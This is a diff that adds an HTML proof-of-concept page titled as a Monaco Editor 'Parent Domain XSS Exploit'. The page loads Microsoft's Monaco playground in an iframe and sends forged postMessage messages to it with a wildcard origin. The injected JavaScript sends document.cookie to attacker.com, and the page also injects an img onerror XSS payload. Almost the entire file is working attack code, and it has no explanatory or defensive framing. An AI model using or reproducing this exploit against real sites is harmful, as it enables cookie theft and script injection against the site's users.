@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Monaco Editor Parent Domain XSS</title>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #1a1a1a; color: #fff; }
+        .status { color: #00ff00; font-size: 20px; margin: 20px 0; }
+        iframe { width: 100%; height: 500px; border: 2px solid #444; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #ff0000; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h1>🔥 Monaco Editor Parent Domain XSS Exploit</h1>
+    <div id="status" class="status">Click button to exploit...</div>
+    <button onclick="exploit()">Execute Parent Domain XSS</button>
+    <br><br>
+    <iframe id="monaco" src="https://microsoft.github.io/monaco-editor/playground.html"></iframe>
+
+    <script>
+        function exploit() {
+            const status = document.getElementById('status');
+            
+            try {
+                const monacoFrame = document.getElementById('monaco');
+                
+                // Method 1: Try to hijack runner iframe
+                setTimeout(() => {
+                    try {
+                        // Access runner iframe (index 0 is usually the runner)
+                        const runnerFrame = monacoFrame.contentWindow.frames[0];
+                        
+                        // Send malicious postMessage that appears to come from runner
+                        runnerFrame.postMessage({
+                            kind: "update-code-string",
+                            codeStringName: "js",
+                            value: "alert('PARENT XSS: ' + document.domain); fetch('https://attacker.com/?cookie=' + document.cookie)"
+                        }, '*');
+                        
+                        status.innerHTML = '✅ Payload sent to runner! Check for alerts.';
+                    } catch (e) {
+                        status.innerHTML = '❌ Error: ' + e.message;
+                    }
+                }, 3000);
+                
+                // Method 2: Direct postMessage to Monaco main window
+                setTimeout(() => {
+                    monacoFrame.contentWindow.postMessage({
+                        kind: "initialize",
+                        state: {
+                            js: "alert('MAIN DOMAIN: ' + document.domain)",
+                            html: "<img src=x onerror=\"alert('XSS: ' + document.domain)\">",
+                            css: "",
+                            reloadKey: 1,
+                            monacoSetup: {}
+                        }
+                    }, '*');
+                }, 5000);
+                
+            } catch (e) {
+                status.innerHTML = 'Error: ' + e.message;
+            }
+        }
+    </script>
+</body>
+</html>
